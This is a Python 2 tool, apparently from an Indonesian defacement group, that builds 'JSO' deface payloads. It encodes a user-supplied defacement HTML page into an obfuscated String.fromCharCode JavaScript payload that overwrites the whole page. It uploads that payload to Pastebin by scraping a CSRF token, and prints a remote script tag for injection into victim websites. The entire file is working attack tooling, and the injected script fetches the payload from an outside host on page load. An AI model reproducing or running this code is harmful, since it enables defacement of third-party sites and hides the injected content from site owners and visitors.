#!/usr/bin/python2
# Author : Mr.Cracked
# Team : Mahiska Cyber Team ( MCT )
# Apa Liat Liat ? Mau Recode ? >_<
# Belajar Boleh, Asalkan Jangan Recode Yak >_<
# Recode Tidak Akan Membuat Anda Menjadi Pencipta Kode :3
# :)

from time import sleep
import platform, random, sys, os, re

M = '\033[1;31m'
H = '\033[1;32m'
K = '\033[1;33m'
U = '\033[1;34m'
P = '\033[1;35m'
C = '\033[1;36m'
W = '\033[1;37m'
A = '\033[90m'

if platform.system() != 'Linux':
	print('Kode Ini Hanya Dapat Di Jalankan Di Platform Linux *_*')
	sys.exit()
	
else:
	pass

try:
	import requests
	from requests.exceptions import ConnectionError
	
except:
	os.system('clear')
	print(C+'Module Belum Di Install'+W+' ...')
	print(C+'Install'+W+' ...')
	print
	os.system('pip2 install requests')
	os.system('clear')
	print(C+'Selesai'+W+' *_*')
	sleep(3)
	os.system('python2 '+__file__)
	
	
os.system('clear')

def banner():
		print(''+C+'''
	
 ___      ___   _____         ____   _____        _       ____   _   _   _____   ___               
|   \    /   | |  _  \       /  __| |  _  \       / \     /  __| | | //  |  ___| |   \                        
| |\ \  / /| | | |_)  )     |  /    | |_)  )     / _ \   |  /    | |//   | |___  | |\ \                        
| | \ \/ / | | |  _  <      | (     |  _  <     / /_\ \  | (     |   \   |  ___| | | ) )                
| |  \__/  | | | | \  |  _  |  \__  | | \  \   / ____  \ |  \__  | |\ \  | |___  | |/ /                                          
|_|        |_| |_|  |_| |_|  \____| |_|  \__\ /_/    \__\ \____| |_| \_\ |_____| |___/      

                '''+W+'Creator : Mr.Cracked\n\t\tYT : MR CRACKED')

def pastebin(jso):
	get = requests.get('http://pastebin.com')
	
	if 'blocked' in get.text or get.status_code != 200:
		print
		print(C+'IP Anda Telah Di Blokir Pastebin')
		print
		print(C+'NOTE'+W+' :  Limit Create Hanya 10 X / 24 Jam.\n\tSekarang Anda Kunjungi Url Pastebin\n\tJika IP Anda Di Blokir Silahkan\n\tMatikan Internet Anda Dan Sambungkan Kembali *_*')
		sys.exit()
	
	else:
		pass
		
	csrf_token = re.findall(r'\<input\ type\=\"hidden\" name\=\"csrf_token_post\" value\=\"(.*?)\">', get.text)
	data = {
	'csrf_token_post' : str(csrf_token[0]), 
	'submit_hidden' : 'submit_hidden',
	'paste_code' : str(jso),
	'paste_format' : '1',
	'paste_expire_date' : 'N',
	'paste_private' : '0',
	'paste_name' : ''
	} 
	
	send = requests.post('https://pastebin.com/post.php', data = data)
	print
	print(C+'Url'+W+' : '+ str(send.url))
	print(C+'Script Jso'+W+' : <script type="text/javascript" src="https://pastebin.com/raw/'+ str(send.url.split('/')[3] +'"></script>'))
	print
	print(C+'NOTE'+W+' :  Limit Create Hanya 10 X / 24 Jam.\n\tSekarang Anda Kunjungi Url Pastebin\n\tJika IP Anda Di Blokir Silahkan\n\tMatikan Internet Anda Dan Sambungkan Kembali *_*')
	
banner()
print
print
list = []

try:
	check = requests.get('http://google.com')
	
except ConnectionError:
	print
	print(M+'Jaringan Tidak Ada !'+W+'')
	print
	sys.exit() 

try:
	script_deface = raw_input(W+'SCRIPT DEFACE ANDA ('+H+' Ex : '+C+'Script.html'+W+' ) : ')
	teks = [ ''.join(oh) for oh in open(script_deface, 'r').readlines() ]

	for text in teks:
		char = [ ord(jso) for jso in text ]
		list.append(str(char).replace('[','').replace(']',''))
	
	char = str(list).replace('[','').replace(']','').replace("'","")

	if '13' in char:
		char = char.replace(', 13','')
	
	else:
		pass
	
	jso = 'document.documentElement.innerHTML=String.fromCharCode(' + str(char) + ')'
	pastebin(jso)

except IOError:
	print
	print(A+'Script Deface Tidak Di Temukan !')
	print
	print(C+'Cara Memindahkan Script Deface Dari Sdcard ('+W+' Handphone'+C+' )\nSebelumnya Izinkan Ruang Penyimpanan Terminalnya, Lalu\n'+K+'$ cp /storage/emulated/0/scriptmu.html /$HOME/Jso'+W+'')
	print
